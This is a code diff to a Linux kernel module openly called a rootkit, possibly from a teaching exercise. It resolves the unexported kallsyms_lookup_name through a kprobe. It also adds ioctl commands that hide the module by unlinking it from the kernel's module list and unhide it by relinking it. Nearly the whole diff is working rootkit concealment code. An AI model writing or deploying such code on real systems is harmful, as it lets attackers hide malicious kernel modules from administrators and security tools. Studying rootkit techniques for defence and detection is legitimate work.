@@ -1,5 +1,7 @@
+#include <linux/kprobes.h>
 #include <linux/module.h>
 #include <linux/cdev.h>
+#include <linux/rculist.h>
 #include "rootkit.h"
 
 #define OURMODNAME	"rootkit"
@@ -15,6 +17,19 @@ static struct cdev *kernel_cdev;
 static dev_t dev_no, dev;
 static unsigned long val = 0xAAAA;
 
+static void * find_symbol_by_name(const char *str) {
+	static struct kprobe kp = {
+		.symbol_name = "kallsyms_lookup_name"
+	};
+
+	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+	kallsyms_lookup_name_t kallsyms_lookup_name;
+	register_kprobe(&kp);
+	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+	unregister_kprobe(&kp);
+	return (void *)kallsyms_lookup_name(str);
+}
+
 static int rootkit_open(struct inode *inode, struct file *filp)
 {
 	printk(KERN_INFO "%s\n", __func__);
@@ -29,6 +44,7 @@ static int rootkit_release(struct inode *inode, struct file *filp) {
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 		unsigned long arg)
 {
+	void *list_ptr = find_symbol_by_name("modules");
 	printk(KERN_INFO "%s\n", __func__);
 
 	switch (ioctl) {
@@ -43,6 +59,16 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 			printk(KERN_INFO "copy_from_user failed!\n");
 		}
 		printk(KERN_INFO "SET_VAL, %lx\n", val);
+		break;
+	case ROOTKIT_HIDE:
+		printk(KERN_INFO "rootkit HIDE\n");
+		list_del_rcu(&THIS_MODULE->list);
+		synchronize_rcu();
+		break;
+	case ROOTKIT_UNHIDE:
+		printk(KERN_INFO "rootkit UNHIDE, %px\n", list_ptr);
+		list_add_rcu(&THIS_MODULE->list, list_ptr);
+		synchronize_rcu();
 		break;
 	}
 
